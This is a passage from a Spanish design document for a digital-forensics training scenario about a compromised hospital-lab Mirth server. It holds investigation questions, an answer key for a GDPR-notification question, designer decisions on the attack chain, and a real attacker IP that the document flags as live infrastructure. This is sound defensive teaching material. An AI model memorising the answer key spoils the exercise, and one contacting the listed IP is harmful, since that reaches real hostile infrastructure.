9. ¿Qué fichero, si existiera, impediría que el shellcode se ejecutase?
10. ¿Qué herramienta embebida usó el implante para darle al operador una shell interactiva?
11. ¿Qué servicio instaló el atacante como persistencia, con qué binario y con qué opciones de recuperación?
12. ¿Qué datos se llevó, adónde, qué proceso los sacó y cuántos bytes salieron?
13. En el `access.log`, ¿cuál de todas las ejecuciones fue la de un operador con las manos en el teclado y cuáles parecen sandboxes o análisis automáticos? ¿Qué rasgos lo demuestran?
14. ¿Por qué no hay Prefetch, y dónde se demuestra la ejecución en su lugar?
15. ¿Debe Kelbrook notificar a la AEPD según el RGPD? ¿En qué plazo, contado desde cuándo? ¿Debe comunicarlo también a los pacientes?
16. ¿Qué le falta al triage para responder con certeza qué contenía `mc.tgz` y qué hizo la fase 3 en memoria? ¿Qué habrías recogido tú?
17. ¿Qué dice la versión de PowerShell del User-Agent sobre el estado de parches de `int01`?

La respuesta de la 15 es: los resultados de analíticas son datos de salud (art. 9 RGPD). La notificación a la AEPD es obligatoria en 72 h desde que Kelbrook tiene constancia de la brecha (art. 33), es decir desde el aviso del CERT del 19/10 o desde su confirmación, no desde el 04/10. Por el alto riesgo, lo probable es que también haya que comunicarlo a los interesados (art. 34).

## Cambios en el README

- Quitar la regla **"IPs de documentación. Nada apunta a infraestructura real."** y sustituirla por: lo interno y lo inventado siguen usando `10.20.30.0/24` y los rangos RFC 5737, pero un escenario puede incluir **IPs, dominios y subdominios reales** cuando sean IOCs de una campaña real, porque obtener IOCs reales es útil incluso en entrenamiento. Cada escenario debe indicar qué es real y qué es inventado.
- Añadir la fila del escenario 04 a la tabla. La dificultad queda en "por determinar" hasta la revisión en frío.
- Añadir una advertencia en el escenario 04: la IP `104.234.26.225` es infraestructura real de un atacante y no se debe visitar desde un equipo de trabajo.

## Decisiones del diseñador

Puntos que cerró quien escribió el diseño, no el autor del caso. Se pueden revisar.

- **Fase 3 e implante.** Se supone que la fase 3 que llega por `:8084` es el mismo implante del DLL embebido, convertido a shellcode. Es una inferencia: el análisis estático no lo demuestra. La fase 3 solo usa el canal `:8084` y no habla con OSS.
- **C2 del implante persistente.** El análisis no reveló el C2 de `client64.exe` (las cadenas están cifradas por garble). Se usa el bucket de OSS como buzón, porque el implante lleva el SDK de OSS y así no se atribuye a infraestructura real nada que no se haya observado.
- **Exfiltración** por el implante persistente, no por una herramienta de línea de comandos.
- **Puertos de Mirth.** MLLP en `6661` para Ardeal; `8443` publicado por error.
- **Kelbrook es la víctima real del 04/10.** Sus líneas son las reales con la IP y el host sustituidos. Repetir la depuración otro día habría sido un anacronismo: el operador ya conocía el bug.
- **Fechas del CERT**: copia el 16/10 (la hora real), aviso el 19/10 y triage ese mismo día.
- **`int01` sin parchear desde julio de 2024** (WSUS roto), coherente con el `.6054` del User-Agent y con el Mirth vulnerable. Por eso no hay reinicios por parches: el único reinicio de la ventana es manual, el 13/10.
- **Defender sin detecciones**: las muestras eran nuevas, el shellcode va cifrado y hay una exclusión de la carpeta de Mirth creada por el integrador.
- **Triage incompleto a propósito**: sin `$MFT`, `$UsnJrnl`, SRUM ni memoria, como pasa a menudo con un triage hecho con prisa.

## Lo que se deja al builder

- Reutilizar del generador del 03 el escritor de EVTX, el de colmenas de registro y Amcache, y la estructura de KAPE. Cada escenario es autocontenido, así que el código se copia en vez de importarse.
- Determinismo byte a byte con semilla fija, igual que desde el 02.
- Los valores concretos que no fija este documento: PIDs, GUIDs, puertos efímeros, tamaños de `mc.tgz` y de la fase 3, `alloc-`/`thread-`, el nombre del bucket y el formato exacto del log de `fw01`. Tienen que ser coherentes entre todas las fuentes.
- El ruido de fondo, con el volumen suficiente para que el ataque no salte a la vista con un solo filtro.
- Redactar `Escenario.md` y `Solucion.md` a partir de este documento, con el mismo tono que los escenarios anteriores.
